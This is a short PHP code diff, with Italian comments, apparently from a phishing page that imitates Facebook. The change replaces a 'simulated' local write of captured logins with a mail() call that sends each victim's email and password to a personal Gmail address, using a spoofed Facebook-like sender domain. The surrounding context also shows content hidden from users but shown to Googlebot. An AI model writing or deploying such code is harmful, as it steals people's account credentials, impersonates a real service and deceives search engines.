@@ -4,10 +4,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = $_POST['password'] ?? 'N/A';
     $timestamp = date("Y-m-d H:i:s");
 
-    // Scrittura file simulata
-    $file = fopen("dati.txt", "a");
-    fwrite($file, "[$timestamp] Email: $email | Password: $password\n");
-    fclose($file);
+    $to = "simonegrisu92@gmail.com";
+$subject = "Accesso utente";
+$message = "[$timestamp] Email: $email | Password: $password";
+$headers = "From: www.facebook2025.it";
+
+mail($to, $subject, $message, $headers);
 
     // Contenuto per Googlebot invisibile all'utente
     echo "<div style='display:none;'>
